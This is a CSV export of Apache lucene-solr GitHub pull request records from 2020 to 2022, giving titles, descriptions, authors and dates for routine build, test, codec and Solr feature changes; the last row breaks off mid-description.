"","2513","SOLR-15378 Suppress SimpleText codec in TestRestoreCore","https://issues.apache.org/jira/browse/SOLR-15378  # Description  Backup/restore doesn't support SimpleTextCodec and because of this testFailedRestore in TestRestoreCore with given seed failed 100%.  # Solution  Adding SuppressCodecs annotation to the test with SimpleText solved the problem. I have developed this change against current branch_8x and ran unit tests.  # Tests  Run unit tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `main` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Reference Guide](https://github.com/apache/solr/tree/main/solr/solr-ref-guide)","closed","","bszabo97","2021-06-14T10:28:07Z","2021-06-17T01:49:19Z"
"","2630","SOLR-15324 Upgrade jaegertracing to 1.6.0 and libthrift to 0.14.1","https://issues.apache.org/jira/browse/SOLR-15324  Upgraded jaeger and libthrift to same versions as in main","closed","","janhoy","2021-12-13T08:05:49Z","2021-12-13T08:25:42Z"
"","2465","SOLR-15224: delete TestXmlQParser class","https://issues.apache.org/jira/browse/SOLR-15224","closed","","cpoerschke","2021-03-08T13:52:34Z","2021-03-08T14:40:37Z"
"","2443","SOLR-15206: improve CoreContainer constructor javadocs","https://issues.apache.org/jira/browse/SOLR-15206","closed","","cpoerschke","2021-03-01T17:33:49Z","2021-03-02T13:44:27Z"
"","2442","SOLR-15205: don't mention (deprecated) CloudSolrClient.setIdField in javadocs","https://issues.apache.org/jira/browse/SOLR-15205  deprecation illustration: https://github.com/apache/lucene-solr/blob/releases/lucene-solr%2F8.7.0/solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java#L297-L306","closed","","cpoerschke","2021-03-01T17:04:48Z","2021-03-05T19:34:36Z"
"","2255","SOLR-15113 Do not attempt to start Solr server when embedded ZK fails","https://issues.apache.org/jira/browse/SOLR-15113","closed","","madrob","2021-01-27T17:12:48Z","2021-01-28T17:37:52Z"
"","2292","SOLR-15129: Use Solr distribution TGZ as docker context","https://issues.apache.org/jira/browse/SOLR-15102  This should work, but there is still cleanup needed with the gradle changes.  Also we might want to infer the Solr version another way.  Backwards incompatibility that needs to be added back in: `/opt/docker-solr`  Changes in the image: - `/opt/docker-solr` -> `/opt/solr/docker` - `/opt/solr` is no longer a sym link, `/opt/solr-` is.","closed","","HoustonPutman","2021-02-02T23:47:53Z","2021-05-19T19:02:33Z"
"","2198","SOLR-15081: Metrics for core: isLeader, status","https://issues.apache.org/jira/browse/SOLR-15081 Copying the description:   > The core level metrics hold some interesting information, but I don't see information pertaining to the SolrCloud status of the core.  In particular, I'd like to see the leader status here, and also the replica state.  The use-case I have in mind is enabling the Prometheus Exporter to get the doc count (and maybe other basics) of only the leader replicas, thereby counting unique documents instead of a fully replicated figure.  This is an approximation to doing a match-all-docs query on all collections, but is a more sound approach when one has orders of magnitude more collections than nodes.","closed","","dsmiley","2021-01-12T23:15:07Z","2021-01-19T21:43:51Z"
"","2197","SOLR-15075: Solr docker gradle improvements","https://issues.apache.org/jira/browse/SOLR-15075  (From JIRA)  Currently Solr uses the gradle docker plugin to manage building Solr docker images. When migrating the docker build into Solr, using the plugin was the path of least resistance and allowed us to migrate without having to think a lot about the gradle part.  Now that the docker image building works, it may be beneficial to migrate away from the docker plugin, so that we can have better control over build process. The steps are simple enough anyways, so we wouldn't be sacrificing much to have more flexibility.  Given the discussion in the community over release vs local docker image builds, there does not seem to be a desire to have separate builds for them. Therefore we no longer need the solr/docker/package module. Instead the solr/docker module will pull in the solr/packaging output and directly put it into the docker image.  Goals - [x] Remove Gradle docker plugin - [x] Remove docker-package intermediate image - [x] Move docker gradle help - [x] Make Gradle tasks respect changes to inputs","closed","","HoustonPutman","2021-01-12T22:28:41Z","2021-01-26T15:26:12Z"
"","2210","SOLR-15073: Fix ClassCastException in SystemInfoHandler.getSecurityInfo","https://issues.apache.org/jira/browse/SOLR-15073","closed","","cpoerschke","2021-01-15T19:38:38Z","2021-01-22T12:10:15Z"
"","2196","SOLR-15071: Fix ArrayIndexOutOfBoundsException in contrib/ltr SolrFeatureScorer","https://issues.apache.org/jira/browse/SOLR-15071","closed","","cpoerschke","2021-01-11T21:43:06Z","2021-01-22T13:35:03Z"
"","2181","SOLR-15069 child parent filter","https://issues.apache.org/jira/browse/SOLR-15069 Repeated issue description: The `parentFilter` param to `[child]` was once required, and then made only optional if you have a `_nest_path_` field, but I think it can be optional (perhaps obsolete) altogether.  All we have to do is grab the uniqueKey field from the document to be transformed, look this up in the `_root_` field, and you'll get the internal Lucene docId of the first child doc.  No problem, and quick.  CC @moshebla  @thomaswoeckinger  I came about doing this because I too-soon documented in #2159 that `_nest_path_` field was no longer required for doing atomic/partial updates in a nested schema.  Instead of removing the documentation I wrote, and then realizing I would then need to add safety prevention (otherwise child docs could vanish on updates!)... it occurred to me, lets just make it work :-)","closed","","dsmiley","2021-01-05T20:53:58Z","2021-01-06T22:43:25Z"
"","2160","SOLR-15057: avoid unnecessary object retention in FacetRangeProcessor","https://issues.apache.org/jira/browse/SOLR-15057","closed","","cpoerschke","2020-12-22T14:58:00Z","2021-01-07T18:45:51Z"
"","2162","SOLR-15051 Blob, DRAFT WIP","https://issues.apache.org/jira/browse/SOLR-15051  Remember this is very WIP... just getting started here.  CC @bruno-roustant  @NazerkeBS @atris","closed","","dsmiley","2020-12-22T21:55:29Z","2021-03-16T17:17:25Z"
"","2120","SOLR-15029 More gracefully give up shard leadership","https://issues.apache.org/jira/browse/SOLR-15029","closed","","madrob","2020-12-04T23:22:21Z","2020-12-15T21:55:17Z"
"","2092","SOLR-15009 Propogate IOException from DF.exists","https://issues.apache.org/jira/browse/SOLR-15009","closed","","madrob","2020-11-20T21:37:08Z","2020-11-30T18:28:53Z"
"","2083","SOLR-15001 Docker: require init_var_solr.sh","https://issues.apache.org/jira/browse/SOLR-15001  There are two distinct commits here.  The second is just to the build.gradle.  I struggled with the Docker gradle build because the inputs/outputs were not configured correctly which confused Gradle's cool incremental build.  I also disagree with defining a verbose class file inside a build file when it won't be re-used by other modules -- just do ad-hoc instead.  Build automation is best suited to scripting languages IMO.","closed","","dsmiley","2020-11-16T19:14:32Z","2020-11-27T20:35:04Z"
"","2089","SOLR-14999: Option to set the advertised port for Solr.","https://issues.apache.org/jira/browse/SOLR-14999  I am open to suggestions on the naming of this new option. Currently I have `-Dsolr.port.advertise` and `SOLR_PORT_ADVERTISE`, because I think those are more descriptive names than `hostPort`.  This is backwards compatible with the current `solr.xml`s, because the default value (`jetty.port`) is now checked in the Java code, rather than the xml.","closed","","HoustonPutman","2020-11-18T20:55:10Z","2021-01-08T23:21:48Z"
"","2115","SOLR-14992 Wait for node down before checking for node up","https://issues.apache.org/jira/browse/SOLR-14992","closed","","madrob","2020-12-02T18:59:56Z","2020-12-04T00:32:08Z"
"","2055","SOLR-14978 OOM Killer in Foreground","https://issues.apache.org/jira/browse/SOLR-14978","closed","","madrob","2020-11-02T17:07:46Z","2020-11-04T23:20:17Z"
"","2017","SOLR-14957: Add Prometheus Exporter to docker PATH. Fix classpath issues.","https://issues.apache.org/jira/browse/SOLR-14957  While testing this out, I was unable to make the `solr-exporter` run without fixing classpath issues. I think this pr, https://github.com/apache/lucene-solr/pull/1972, was trying to fix a similar thing but with a bigger scope. I ultimately support that goal of that PR, but thought I might as well include my fixes in this PR as they are small and can be easily overridden if necessary.  I made the necessary changes to get the exporter to run with default settings:  - Adding prometheus-exporter/conf to the classpath and changing the default config file to be the location of the file on the classpath - Adding the `solr/server/lib/ext` jars to the classpath in order to get logging to work.","closed","","HoustonPutman","2020-10-21T21:53:14Z","2020-10-26T18:15:36Z"
"","2038","SOLR-14955: Add env var options to Prometheus Export scripts.","https://issues.apache.org/jira/browse/SOLR-14955","closed","","HoustonPutman","2020-10-26T19:02:30Z","2020-10-30T15:15:43Z"
"","2074","SOLR-14949: Adding githubUrl option for docker build.","https://issues.apache.org/jira/browse/SOLR-14949  Missed one option for customizing the building of docker images.","closed","","HoustonPutman","2020-11-10T16:27:38Z","2020-11-10T18:31:37Z"
"","2020","SOLR-14949: Ability to customize Solr Docker build","https://issues.apache.org/jira/browse/SOLR-14949  Custom inputs: - Docker Image repo - Docker Image tag - Docker Image name - Base Docker Image  Also added a gradlew helpDocker page.","closed","","HoustonPutman","2020-10-22T15:40:23Z","2020-11-16T16:35:39Z"
"","2007","SOLR-14947: Print out image info after gradle docker task.","https://issues.apache.org/jira/browse/SOLR-14947  After running `./gradlew docker` the following output is given:  ``` Solr Docker Image Created 	Name: apache/solr:9.0.0-SNAPSHOT 	Base Image: openjdk:11-jre-slim ```","closed","","HoustonPutman","2020-10-19T19:13:01Z","2020-10-22T15:30:48Z"
"","1994","Mention 'ant server' equivalent(s) in help/ant.txt file.","https://issues.apache.org/jira/browse/SOLR-14941","closed","","cpoerschke","2020-10-16T14:25:04Z","2021-12-22T15:33:16Z"
"","1992","SOLR-14939: JSON range faceting to support cache=false parameter","https://issues.apache.org/jira/browse/SOLR-14939","closed","","cpoerschke","2020-10-16T12:18:37Z","2020-12-16T17:42:31Z"
"","2031","SOLR-14937: Correct client.queryDefaults().set(...) calls in some JSON facet tests.","https://issues.apache.org/jira/browse/SOLR-14937  #1987 was for the master branch but attempting to cherry-pick that commit back to branch_8x gave some non-trivial merge conflicts, hence this separate but equivalent pull request here for branch_8x.","closed","","cpoerschke","2020-10-26T10:31:08Z","2020-11-02T15:21:18Z"
"","1987","SOLR-14937: Correct client.queryDefaults().set(...) calls in some JSON facet tests.","https://issues.apache.org/jira/browse/SOLR-14937","closed","","cpoerschke","2020-10-15T16:22:37Z","2020-10-26T09:44:04Z"
"","2159","SOLR-14923: Nested docs indexing performance.","https://issues.apache.org/jira/browse/SOLR-14923  * UpdateLog.openRealtimeSearcher() was being called for every incoming document when the schema had _nest_path_.  It is now more limited to in-place-update of a child doc and in /get when a child doc is given, both of which are uncommon. * Atomic/partial updates to nested documents should be faster. In-place updates of the same might be slower (needs to call openRealtimeSearcher).  Refactoring & minor bugs/improvements: * Simplified AddUpdateCommand.getLuceneDoc & getLuceneDocsIfNested relationship, and DirectUpdateHandler2 which calls them. * AddUpdateCommand.getIndexedId needed to be updated when _route_ was specified. * NestedShardedAtomicUpdateTest no longer extends AbstractFullDistribZkTestBase because it wasn't really leveraging the ""control client"" checking, and it added too much complexity to debug failures. * AtomicUpdateDocumentMerger: simplified merge; possibly now supports updates to anonymous children * No longer need RTG.Resolution.DOC_WITH_CHILDREN","closed","","dsmiley","2020-12-21T21:46:38Z","2021-01-08T05:12:03Z"
"","1953","SOLR-14917: Move DOMUtil and PropertiesUtil to SolrJ","https://issues.apache.org/jira/browse/SOLR-14917  Not worth a CHANGES.txt. On 8x, will keep the classes marked with Deprecated annotation and as subclasses so there's no code to maintain","closed","","dsmiley","2020-10-06T19:52:32Z","2020-10-10T12:52:29Z"
"","1996","SOLR-14907: Adding V2 API for ConfigSet Upload.","https://issues.apache.org/jira/browse/SOLR-14907  Adding v2 APIs.","closed","","HoustonPutman","2020-10-16T17:31:47Z","2020-11-02T19:06:51Z"
"","1977","SOLR-14907: Support single file upload/overwrite in configSet API","https://issues.apache.org/jira/browse/SOLR-14907","closed","","HoustonPutman","2020-10-12T17:32:10Z","2020-10-13T20:51:27Z"
"","1891","SOLR-14877: Add github action for running SolrJ tests.","https://issues.apache.org/jira/browse/SOLR-14877","closed","","HoustonPutman","2020-09-18T21:13:56Z","2020-10-19T16:26:16Z"
"","1870","SOLR-14865: 'Index Merge Metrics' documentation correction","https://issues.apache.org/jira/browse/SOLR-14865","closed","","cpoerschke","2020-09-14T13:59:32Z","2020-11-02T15:25:20Z"
"","1859","SOLR-14856: Adding docker test to github workflow.","https://issues.apache.org/jira/browse/SOLR-14856","closed","","HoustonPutman","2020-09-11T16:48:10Z","2020-09-18T21:06:10Z"
"","1843","SOLR-14846 Remove Optional.ofNullable.orElse pattern","https://issues.apache.org/jira/browse/SOLR-14846","closed","","madrob","2020-09-08T18:22:11Z","2020-09-09T14:19:53Z"
"","1832","SOLR-14831: remove deprecated-and-unused ""facet.distrib.mco"" constant","https://issues.apache.org/jira/browse/SOLR-14831","closed","","cpoerschke","2020-09-04T14:44:08Z","2020-09-09T12:09:26Z"
"","1825","SOLR-14828: reduce 'error' logging noise in BaseCloudSolrClient.requestWithRetryOnStaleState","https://issues.apache.org/jira/browse/SOLR-14828","closed","","cpoerschke","2020-09-03T16:38:04Z","2020-09-24T16:06:53Z"
"","1838","SOLR-14768: Fix multipart POST to Solr.","https://issues.apache.org/jira/browse/SOLR-14768  Regression from 8.6  Multipart POST would fail due to a NoClassDefFoundError of Jetty MultiPart.  Solr cannot access many Jetty classes, which is not noticeable in our tests.  I tested this manually:  I started the ""techproducts"" schema via `bin/solr start -e techproducts` then I did this:  ```` curl http://localhost:8983/solr/techproducts/update/extract \  -F literal.id=doc2 -F stream.body=@example/exampledocs/sample.html ```` It should work.  It used to dump a stacktrace from Solr.  I would be awesome if we could have an automated test for this given the test infrastructure we have, but AFAIK I don't see anything.  A suitable test would need to run bin/solr.  If we had a SolrExampleTests subclass that required a URL input then we could run tests against a Solr instance that is being released by the smoketester and also by a future Docker release process.  I'll raise this particular matter in the dev list for discussion.","closed","","dsmiley","2020-09-07T05:38:32Z","2020-09-22T22:13:53Z"
"","1726","SOLR-14722: timeAllowed should track from req creation","https://issues.apache.org/jira/browse/SOLR-14722","closed","","dsmiley","2020-08-07T20:31:27Z","2020-08-16T15:39:23Z"
"","1716","SOLR-14706: Fix support for default autoscaling policy","https://issues.apache.org/jira/browse/SOLR-14706  This is to introduce backwards compatibility for the default autoscaling policy that was removed in 8.6.1 (and 8.7).  The upgrade notes now include the steps to remove the default autoscaling policy via the autoscaling API.  I have tested the following upgrade patterns, and am happy with the results. I'll do more tests if y'all think it is necessary.  8.6.0 -> 8.6.1 RC1 (fail) 8.6.0 -> this patch (success) 8.6.0 -> 8.6.1 RCI -> this patch (success)  I will also be porting this with a few documentation tweaks to 8x","closed","","HoustonPutman","2020-08-04T15:41:07Z","2020-08-10T15:43:40Z"
"","1754","SOLR-14700: avoid NPEs in TupleStream.getShards() when streamContext … …is null.","https://issues.apache.org/jira/browse/SOLR-14700","closed","","cpoerschke","2020-08-14T16:32:25Z","2020-08-24T12:00:43Z"
"","1675","SOLR-14652: SolrCore should hold its own CoreDescriptor","https://issues.apache.org/jira/browse/SOLR-14652 (minor refactoring) Also: * SolrCore's constructors don't need a ""name"" since it's guaranteed to always be the name in the coreDescriptor.  I checked. * SolrCore's constructor shouldn't call coreContainer.solrCores.addCoreDescriptor(cd); because it's the container's responsibility to manage such things.  I made SolrCores.putCore ensure the descriptor is added, and this is called by CoreContainer.registerCore which is called after new SolrCore instances are created. * solrCore.setName should only be called when we expect the name to change.  Furthermore that shouldn't ever happen in SolrCloud so I added checks. * solrCore.setName calls coreMetricManager.afterCoreSetName() which is something that is really only related to a rename, not name initialization (from the constructor).  I renamed that method and further only call it if the name did change from non-null.  CC @sigram   @ErickErickson you might want to do a code review based on your past interactions with the CoreContainer/CoreDescriptor/SolrCores/SolrCore relationship.  I'm doubtful this deserves a CHANGES.txt entry; invisible to users and is relatively minor.","closed","","dsmiley","2020-07-16T04:39:06Z","2020-07-27T18:00:52Z"
"","2284","SOLR-11233: Add optional JAVA8_GC_LOG_FILE_OPTS for bin/solr.","https://issues.apache.org/jira/browse/SOLR-11233  Since `master` branch does not support Java8 this change is best tested on `branch_8x` but could then potentially still be cherry-picked to `master` branch if we want to keep the `bin/solr*` code on both branches similar.","closed","","cpoerschke","2021-02-01T17:24:05Z","2021-03-19T18:16:02Z"
"","1913","SOLR-11167: Avoid $SOLR_STOP_WAIT use during 'bin/solr start' if $SOLR_START_WAIT is supplied.","https://issues.apache.org/jira/browse/SOLR-11167","closed","","cpoerschke","2020-09-23T12:05:15Z","2020-09-24T16:08:37Z"
"","2382","LUCENE-9780: Only validate JARs for tasks that are enabled","https://issues.apache.org/jira/browse/LUCENE-9780","closed","","HoustonPutman","2021-02-16T19:30:25Z","2021-02-17T23:12:29Z"
"","2358","LUCENE-9762: FunctionScoreQuery must guard score() called twice","https://issues.apache.org/jira/browse/LUCENE-9762  The score() may be called multiple times. It should take care to call DoubleValues.advanceExact only the first time, or risk faulty behavior including exceptions.  There isn't an 8.8.1 section in the CHANGES.txt on master branch but I can add it into branch_8x and branch_8_8 where eventually it will show up when the RM does a release?  Or I should just add it?","closed","","dsmiley","2021-02-12T06:12:12Z","2021-02-14T06:34:29Z"
"","2231","LUCENE-9680 - Re-add IndexWriter::getFieldNames","https://issues.apache.org/jira/browse/LUCENE-9680  # Description  As discussed in [this thread](http://mail-archives.apache.org/mod_mbox/lucene-dev/202101.mbox/browser), the `indexWriter::getFieldNames()` method is useful for enforcing soft/hard limits of index usage.   I simply re-added `getFieldNames()` we recently removed in [LUCENE-8909](https://issues.apache.org/jira/browse/LUCENE-8909).  # Tests  Added a unit test on `IndexWriter`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","orenovadia","2021-01-21T21:26:52Z","2021-02-03T22:33:50Z"
"","2163","LUCENE-9647 Add back github action for Ant","https://issues.apache.org/jira/browse/LUCENE-9647  Tagging @tflobbe for review because you removed the file in the first place. If there's a better place to put it, let me know.","closed","","madrob","2020-12-22T22:41:14Z","2020-12-23T22:51:53Z"
"","1956","LUCENE-9563: Add .editorconfig","https://issues.apache.org/jira/browse/LUCENE-9563","closed","","dsmiley","2020-10-07T04:06:45Z","2021-01-02T07:01:03Z"
"","1860","LUCENE-9488 Update release process to work with gradle","https://issues.apache.org/jira/browse/LUCENE-9488","closed","","madrob","2020-09-11T19:25:19Z","2020-09-21T23:01:26Z"
"","1731","LUCENE-9451 Sort.rewrite does not always return this when unchanged","https://issues.apache.org/jira/browse/LUCENE-9451","closed","","madrob","2020-08-10T16:31:30Z","2020-09-04T14:46:07Z"
"","1983","[LUCENE-9410] German/French stemmers fail for common forms maux, gegrüßt, grüßend, schlummert","https://issues.apache.org/jira/browse/LUCENE-9410  I don't know if it's just an acceptable exception or something serious? I wrote test cases for these words. Should them be mapped by hand to simple forms?","open","","wojtek2kdev","2020-10-14T19:19:21Z","2020-10-15T12:29:56Z"
"","2441","LUCENE-8626: enforce name standardisation for org.apache.lucene tests","https://issues.apache.org/jira/browse/LUCENE-8626  Built upon @dweiss's #1743 changes this pull request here restricts itself to `org.apache.lucene` tests only and enforces the naming convention for those tests only and always with no exceptions.","closed","","cpoerschke","2021-03-01T16:41:52Z","2021-03-08T15:31:11Z"
"","2440","LUCENE-8626: standardise 3 more Lucene test names","https://issues.apache.org/jira/browse/LUCENE-8626","closed","","cpoerschke","2021-03-01T16:17:30Z","2021-03-08T13:21:56Z"
"","2650","LUCENE-10477: SpanBoostQuery.rewrite was incomplete for boost==1 factor.","https://issues.apache.org/jira/browse/LUCENE-10477","closed","","cpoerschke","2022-03-21T13:09:35Z","2022-03-21T14:11:57Z"
"","2575","LUCENE-10107","https://issues.apache.org/jira/browse/LUCENE-10107","closed","","madrob","2021-09-16T13:13:57Z","2021-09-20T21:12:15Z"
"","2652","Improve Solr startup to reduce loading zk traffic from`SolrClientNodeStateProvider`","https://app.shortcut.com/fullstory/story/187389/improve-solr-startup-to-reduce-loading-zk-traffic-from-solrclientnodestateprovider#activity-189815","closed","","noblepaul","2022-04-04T06:47:00Z","2022-04-04T06:47:35Z"
"","2566","LUCENE-10091 Fix some old errors in the benchmark module","Hi, I found that the benchmark module hasn't been maintained for a long time. Some scripts were executed incorrectly, and some codes were outdated. I tried to fix a few small bugs, including: collector-small.alg, collector.alg, NewAnalyzerTask.java.  Execute the following command to verify:   ant run-task -Dtask.alg=conf/analyzer.alg   ant run-task -Dtask.alg=conf/collector-small.alg   ant run-task -Dtask.alg=conf/collector.alg -Dtask.mem=1024M","closed","","xiaoshi2013","2021-09-08T03:58:28Z","2021-09-09T16:46:45Z"
"","1782","SOLR-14616: Remove CDCR from 9.0","Here's the fresh PR after messing up the branch in previous PR: https://github.com/apache/lucene-solr/pull/1648","closed","","chatman","2020-08-25T18:00:16Z","2020-11-10T22:44:33Z"
"","2648","Widen version.base acceptance criteria to allow x.y.z.a (4 parts) format","Having an internal build system that uses that last bit as a tracker is really useful. The other option is for folks to have this in an internal fork, but considering we allow 1 & 2 as valid values, I feel it makes sense to allow more.   If there's something that I'm not seeing, I'd be happy to learn about it.","closed","","anshumg","2022-03-18T19:55:37Z","2022-03-18T21:32:47Z"
"","2293","LUCENE-9725: Allow BM25FQuery to use other similarities.","From a high level, BM25FQuery (1) computes statistic that represent the combined field content and (2) passes these to a score function. This model makes sense for many similarities besides BM25.  This PR unhardcodes BM25Similarity in BM25FQuery and instead uses the one configured on IndexSearcher. It also renames BM25FQuery since it's no longer specific to BM25.","closed","","jtibshirani","2021-02-03T00:14:38Z","2021-02-04T20:42:49Z"
"","2027","SOLR-14954: Heavily edit reindexing.adoc","Found the file again after totally messing up my repository.","closed","","ErickErickson","2020-10-25T17:15:20Z","2020-10-26T18:39:31Z"
"","2366","SOLR-15145: Additional fix for SolrJ back-compat","Found an additional problem when doing rolling upgrades related to base_url, so pulling this fix over from 8x","closed","","thelabdude","2021-02-14T16:09:29Z","2021-02-14T17:19:20Z"
"","1739","SOLR-14706: Fix support for default autoscaling policy (8x forward-port)","forward-porting #1716 for https://issues.apache.org/jira/browse/SOLR-14706","closed","","HoustonPutman","2020-08-11T18:44:04Z","2020-08-11T21:22:28Z"
"","2166","SOLR-15060: Introduce DelegatingDirectoryFactory.","For the description, see https://issues.apache.org/jira/browse/SOLR-15060  This PR adds a new method get(String path, DirContext dirContext, String rawLockType, Function wrappingFunction) in DirectoryFactory, with a new wrappingFunction parameter. The existing get(String path, DirContext dirContext, String rawLockType) calls the new one with Function.identity().  I wonder if this change should be 8x or 9x.","open","","bruno-roustant","2020-12-23T22:27:20Z","2021-01-13T22:22:10Z"
"","1714","Assign sdk based on the new cluster  APIs","for review and discussion purposes","closed","","noblepaul","2020-08-03T02:08:51Z","2020-09-01T07:46:30Z"
"","2334","LUCENE-9705: Create Lucene90TermVectorsFormat","For now this is just a copy of Lucene90TermVectorsFormat. The existing Lucene50TermVectorsFormat was moved to backwards-codecs, along with its utility classes.","closed","","iverase","2021-02-09T11:34:19Z","2021-02-24T10:15:15Z"
"","2310","LUCENE-9705: Create Lucene90PostingsFormat","For now this is just a copy of Lucene90PostingsFormat. The existing Lucene84PostingsFormat was moved to backwards-codecs, along with its utility classes.","closed","","jtibshirani","2021-02-05T19:34:56Z","2021-02-22T18:45:15Z"
"","2274","LUCENE-9705: Create Lucene90LiveDocsFormat","For now this is just a copy of Lucene50LiveDocsFormat. The existing Lucene50LiveDocsFormat was moved to backwards-codecs.","closed","","jtibshirani","2021-01-29T22:04:46Z","2021-02-04T18:43:20Z"
"","2444","LUCENE-9705: Create Lucene90StoredFieldsFormat","For now this is just a copy of  Lucene90StoredFieldsFormat. The existing  Lucene87StoredFieldsFormat is moved to backwards-codecs, along with its utility classes.","closed","","iverase","2021-03-02T09:38:45Z","2021-03-09T07:12:06Z"
"","2392","LUCENE-9705: Create Lucene90DocValuesFormat and Lucene90NormsFormat","For now these are just copies of Lucene80DocValuesFormat and Lucene80NormsFormat. The existing formats were moved to backwards-codecs.","closed","","jtibshirani","2021-02-17T21:43:43Z","2021-02-22T19:49:05Z"
"","1948","LUCENE-9536: Optimize OrdinalMap when one segment contains all distinct values.","For doc values that are not too high cardinality, it is common for some large segments to contain all distinct values. In this case, we can check if the first segment ords map perfectly to global ords, and if so store the global ord deltas and first segment indices as `LongValues.ZEROES` to save some space.","closed","","jtibshirani","2020-10-05T20:24:47Z","2020-11-02T17:22:13Z"
"","2002","SOLR Mark only @deprecated tag, not @Deprecated annotation","For DIH, HDFS, Velocity. These [will] *move* outside the Solr project, and are not disappearing from a user's standpoint.  Use of Deprecated annotation on a plugin will cause a warning on startup, which will needlessly alarm users for these plugins.  See https://issues.apache.org/jira/browse/SOLR-12987?page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel&focusedCommentId=17203524#comment-17203524 And raised recently on the dev list.","closed","","dsmiley","2020-10-18T17:04:06Z","2020-10-21T04:12:11Z"
"","1786","SOLR-14752 Fix zk status with prometheus enabled zookeeper","Followup to #1771 (https://issues.apache.org/jira/browse/SOLR-14752)  Just cleaned up the test","closed","","janhoy","2020-08-26T07:57:45Z","2020-08-26T08:26:39Z"
"","1898","SOLR-14882","Fixing up the .jsonl versus .json format on `bin/solr export`.","closed","","epugh","2020-09-21T13:47:48Z","2021-02-15T17:52:27Z"
"","2030","Fix CHANGES.txt for 8.7","Fixing merge issues with 8.7 change notes","closed","","atris","2020-10-26T08:30:22Z","2020-10-27T09:09:46Z"
"","2025","SOLR-14844: Upgrade Jetty to 9.4.32.v20200930 8x","fixes the test failure by setting min compression in JettySolrRunner","closed","","ErickErickson","2020-10-24T20:04:07Z","2020-10-25T16:14:38Z"
"","2024","SOLR-14844: Upgrade Jetty to 9.4.32.v20200930 master","Fixes the checksum issue","closed","","ErickErickson","2020-10-24T20:03:08Z","2020-10-25T15:59:53Z"
"","2107","SOLR-15017: The core's lib/ folder content is not loaded in the classloader anymore when the core's configuration does not define any  element","Fixes https://issues.apache.org/jira/browse/SOLR-15017","closed","","tmortagne","2020-11-30T14:01:00Z","2020-12-01T20:40:21Z"
"","2241","@gus-asf LUCENE-9575 Provide a producer for PatternTypingRule in TestRandomChains","fixes failure with seed 65EA739C95F40313","closed","","gus-asf","2021-01-25T09:43:58Z","2021-01-25T12:49:47Z"
"","2049","SOLR-14969: Prevent creating multiple cores with the same name which leads to instabilities (race condition)","Fixed ecjLint failure. All tests pass on master.","closed","","ErickErickson","2020-10-30T03:22:53Z","2020-11-02T13:53:55Z"
"","2555","Branch 8x zl","Fixed ant run-task command run error","closed","","xiaoshi2013","2021-08-18T03:27:25Z","2021-08-18T04:01:37Z"
"","1958","SOLR-14919 add param COMMIT_END_POINT on commitOnLeader","Fixed a problem in which the IgnoreCommitOptimizeUpdateProcessorFactory was not in the expected state because COMMIT_END_POINT was no longer sent to the Leader when recovering.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description IgnoreCommitOptimizeUpdateProcessor does not work during replication. So, add parameter in `commitOnLeader` function.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  There is no RecoveryStrategy tests probably.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","miyazakt","2020-10-07T09:05:11Z","2020-10-07T09:05:11Z"
"","2651","SOLR-16110 Using Schema/Config API breaks the File-Upload of Config Set File","fix: touchConfDir keeps current data at config node (SOLR-16110)","closed","","smoldenhauer-ish","2022-03-29T12:31:32Z","2022-05-05T17:05:10Z"
"","2136","SOLR-15037: fix prevent config change listener to reload core while s…","fix prevent config change listener to reload core while schema is changed   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This results makes update schema command return, without waiting for the core to be  fully reloaded. Subsequent requests will use an old schema until reload is done.  This is since: https://github.com/apache/lucene-solr/commit/669aff2108f0a8b298cd0afc23d20c658ab53a9d  see also http://mail-archives.apache.org/mod_mbox/lucene-solr-user/202011.mbox/%3CAM0PR01MB42434E9DEB99F01CD88A4A02F3E30%40AM0PR01MB4243.eurprd01.prod.exchangelabs.com%3E  # Solution  Changed SchemaUpdateLock from Object to Lock and all usages from synchronized to try{lock}finally{unlock} to prevent config update listener to trigger a core.reload if a schema lock is opened.   # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x ] I have created a Jira issue and added the issue ID to my pull request title. - [ x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref 